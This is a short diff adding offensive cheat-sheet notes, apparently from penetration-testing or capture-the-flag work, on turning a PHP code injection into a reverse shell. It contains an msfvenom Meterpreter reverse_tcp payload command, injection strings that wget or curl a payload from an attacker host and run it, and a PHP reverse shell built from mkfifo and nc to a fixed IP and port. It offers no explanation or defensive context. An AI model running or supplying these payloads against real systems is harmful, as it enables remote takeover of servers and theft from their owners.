@@ -1,3 +1,19 @@
+First (Msfvenom Payload)
+
+#Create payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf#Wget into /tmp (Url Encoded)
+' and die(system("wget 'http://<ip>/shell.elf' -O /tmp/shell.elf")) or '#Run while use multi/handler
+' and die(system("/tmp/shell.elf")) or '
+
+-----------------------------------------------------------
+
+Second (Curl Php)
+
+#Create a php reverse shell (shell.php)
+<?php
+    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.142 9001 >/tmp/f');
+?>#Curl and listen (Url Encoded)
+' and die(system("curl http://<ip>/shell.php|php")) or '
 
 -----------------------------------------------------
 
